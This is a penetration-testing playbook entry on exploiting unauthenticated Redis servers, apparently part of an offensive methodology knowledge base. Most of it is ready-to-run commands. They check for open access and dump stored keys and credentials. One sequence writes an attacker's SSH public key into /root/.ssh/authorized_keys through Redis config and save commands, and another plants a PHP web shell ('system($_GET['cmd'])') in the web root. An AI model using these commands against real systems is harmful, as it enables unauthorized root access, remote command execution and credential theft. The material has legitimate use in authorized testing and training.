---
id: redis-enum
title: Redis Enumeration
stage: enumeration
tags: [linux, redis]
summary: Unauthenticated Redis running as root can have an SSH key written directly into authorized_keys — instant foothold.
leads_to:
  - rev-shell
  - ssh-access
  - linux-cron
---

## Prerequisites

Port 6379 open. Authentication is disabled by default on older Redis installs. The SSH key injection technique requires Redis running as root or as the target user.

Redis is an in-memory key-value store that, when exposed without authentication, lets you reconfigure the server's persistence paths. Writing your public key to `authorized_keys` via Redis requires only network access — no exploit, no password. If Redis isn't running as root, check `config get dir` to see what user it runs as and what paths it can write.

## Quick Win

> Ping to confirm unauthenticated access, then read the config path.

```bash
redis-cli -h $TARGET ping   # PONG = open and unauthenticated
redis-cli -h $TARGET config get dir
redis-cli -h $TARGET config get dbfilename
```

## Enumerate Keys

> See what's stored — may contain API keys, session tokens, or application credentials.

```bash
redis-cli -h $TARGET info
redis-cli -h $TARGET keys '*'
redis-cli -h $TARGET get <key>
```

## Write SSH Key (if running as root or key-owner)

> Redirects Redis persistence to .ssh/authorized_keys — no filesystem access required.

```bash
# 1. Generate key pair
ssh-keygen -t rsa -f /tmp/redis_key -N ''

# 2. Inject via Redis
redis-cli -h $TARGET
> config set dir /root/.ssh
> config set dbfilename authorized_keys
> set crackit "\n\n$(cat /tmp/redis_key.pub)\n\n"
> save

# 3. SSH in
ssh -i /tmp/redis_key root@$TARGET
```

## Write Web Shell (if web root is writable)

> If Redis can write to the web root, drop a PHP shell.

```bash
redis-cli -h $TARGET
> config set dir /var/www/html
> config set dbfilename shell.php
> set shell "<?php system($_GET['cmd']); ?>"
> save
```

## Leads To

SSH key injection → ssh-access as root (immediate). Web shell write → rev-shell. Stored keys/tokens in Redis data → try against other services. If running as non-root, check what home directory is writable and repeat the authorized_keys technique for that user.
